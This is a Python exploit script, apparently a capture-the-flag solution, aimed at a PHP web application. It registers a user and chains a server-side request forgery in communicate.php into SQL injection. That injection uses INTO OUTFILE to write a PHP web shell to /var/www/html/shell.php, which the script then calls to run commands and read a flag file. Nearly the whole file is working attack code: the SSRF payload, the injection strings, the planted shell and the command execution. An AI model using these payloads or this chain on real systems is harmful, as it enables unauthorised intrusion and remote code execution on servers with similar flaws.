#!/usr/bin/env python3
import requests
from urllib.parse import urljoin
import random
import string
import sys

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def exploit(target):
    ip, port = target.split(':')
    base_url = f"http://{ip}:{port}"
    register_url = urljoin(base_url, "/register.php")
    login_url = urljoin(base_url, "/login.php")
    com_url = urljoin(base_url, "/communicate.php")
    random_username = f"user_{generate_random_string()}"
    registration_data = {
        "name": "pain",
        "username": random_username,
        "password": "password123",
    }
    loginInfo = {
        "username": registration_data["username"],
        "password": registration_data["password"],
    }
    php_shell = "<?php system($_GET['cmd']); ?>"
    hex_shell = php_shell.encode().hex()
    # Updated SSRF payload to match the write-up
    ssrf_payload = "0://127.0.0.1:80,motherland.com:/"
    
    try:
        with requests.Session() as session:
            print(f"[*] Registering user: {random_username}")
            register_response = session.post(register_url, data=registration_data)
            if "Username already taken" not in register_response.text:
                print("[+] Registration successful")
            else:
                print("[-] Registration failed")
                return

            print("[*] Logging in...")
            login_response = session.post(login_url, data=loginInfo)
            if "Invalid credentials" not in login_response.text:
                print("[+] Login successful :)")
            else:
                print("[-] Login failed :(")
                return

            # Step 1: Use SSRF to update the name with SQL injection payload
            # Test SQL injection by setting name to "hacked'" to confirm vulnerability
            test_sql_payload = "hacked'"
            files = {
                'url': (None, ssrf_payload),
                'data[new_name]': (None, test_sql_payload),
                'data[action]': (None, 'edit')
            }
            print("[*] Sending SSRF payload to set name to 'hacked'...")
            communicate_response = session.post(com_url, files=files)
            print(f"[+] Status: {communicate_response.status_code}")
            print("[*] Visiting index.php to trigger SQL injection (should show error)...")
            session.get(base_url)
            index_response = session.get(base_url)
            print("[+] Response from index.php (should show SQL error):")
            print(index_response.text)

            # Step 2: Use SSRF to set name to SQL injection payload for writing webshell
            sql_payload = f"hacked' UNION SELECT null,'<?php system(\$_GET[\"cmd\"]); ?>',null,null,null INTO OUTFILE '/var/www/html/shell.php'-- -"
            files = {
                'url': (None, ssrf_payload),
                'data[new_name]': (None, sql_payload),
                'data[action]': (None, 'edit')
            }
            print("[*] Sending SSRF + SQL injection payload to write webshell...")
            communicate_response = session.post(com_url, files=files)
            print(f"[+] Status: {communicate_response.status_code}")
            print("[*] Visiting index.php to trigger SQL injection...")
            session.get(base_url)

            # Step 3: Access the webshell and retrieve the flag
            print("[*] Attempting to access shell.php...")
            shell = session.get(urljoin(base_url, "shell.php"), params={"cmd": "cat /60597c54d78cfe6f_flag.txt"})
            print("[+] Shell response (should contain flag):")
            print(shell.text)

    except Exception as e:
        print(f"[-] Error: {str(e)}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <ip:port>")
        sys.exit(1)
    exploit(sys.argv[1])
